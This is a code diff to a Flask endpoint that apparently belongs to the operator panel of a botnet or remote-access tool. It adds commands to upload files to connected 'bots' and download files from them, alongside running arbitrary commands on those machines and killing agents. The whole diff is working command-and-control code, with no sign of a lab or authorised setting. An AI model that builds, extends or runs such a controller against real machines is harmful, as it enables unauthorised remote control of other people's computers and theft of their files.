@@ -178,14 +178,49 @@ def send_command():
         
     bot = Bot.botList[session_id]
     try:
-        if command == 'quit':
+        # Handle file upload/download commands
+        if command.startswith('upload '):
+            filename = command[7:]  # Get filename after 'upload '
             try:
-                # Just try to send quit and cleanup immediately
-                try:
-                    bot.reliable_send('quit')
-                except:
-                    pass
-                bot.cleanup()
+                with open(filename, 'rb') as f:
+                    file_data = f.read()
+                success, message = bot.upload_file(file_data, filename)
+                return jsonify({
+                    'success': success,
+                    'output': message
+                })
+            except FileNotFoundError:
+                return jsonify({
+                    'error': f'File not found: {filename}'
+                }), 404
+            except Exception as e:
+                return jsonify({
+                    'error': f'Upload error: {str(e)}'
+                }), 500
+
+        elif command.startswith('download '):
+            filename = command[9:]  # Get filename after 'download '
+            success, message, file_data = bot.download_file(filename)
+            if success:
+                # Save the file in downloads directory
+                os.makedirs('downloads', exist_ok=True)
+                save_path = os.path.join('downloads', os.path.basename(filename))
+                with open(save_path, 'wb') as f:
+                    f.write(file_data)
+                return jsonify({
+                    'success': True,
+                    'output': message,
+                    'path': save_path
+                })
+            else:
+                return jsonify({
+                    'error': message
+                }), 500
+
+        # For quit command
+        elif command == 'quit':
+            try:
+                bot.kill()
                 logging.info(f"Agent {session_id} terminated")
                 return jsonify({
                     'success': True,
@@ -193,20 +228,15 @@ def send_command():
                 })
             except Exception as e:
                 logging.error(f"Error during termination of agent {session_id}: {e}")
-                # Make sure it's removed from the list
                 if session_id in Bot.botList:
-                    try:
-                        Bot.botList[session_id].cleanup()
-                    except:
-                        if session_id in Bot.botList:
-                            del Bot.botList[session_id]
+                    Bot.botList[session_id].cleanup()
                 return jsonify({
                     'success': True,
                     'message': 'Agent forcefully terminated'
                 })
-        
+
         # For other commands
-        try:
+        else:
             bot.reliable_send(command)
             response = bot.reliable_recv()
             
@@ -224,26 +254,12 @@ def send_command():
                 'output': response
             })
             
-        except Exception as e:
-            logging.error(f"Command execution error: {str(e)}")
-            # Clean up if connection is broken
-            if session_id in Bot.botList:
-                Bot.botList[session_id].cleanup()
-            return jsonify({
-                'error': f'Command execution failed: {str(e)}'
-            }), 500
-            
     except Exception as e:
-        logging.error(f"Unexpected error in send_command: {str(e)}")
-        # Final cleanup attempt
+        logging.error(f"Command execution error: {str(e)}")
         if session_id in Bot.botList:
-            try:
-                Bot.botList[session_id].cleanup()
-            except:
-                if session_id in Bot.botList:
-                    del Bot.botList[session_id]
+            Bot.botList[session_id].cleanup()
         return jsonify({
-            'error': f'Internal server error: {str(e)}'
+            'error': f'Command execution failed: {str(e)}'
         }), 500
 
 @app.route('/api/set_alias', methods=['POST'])
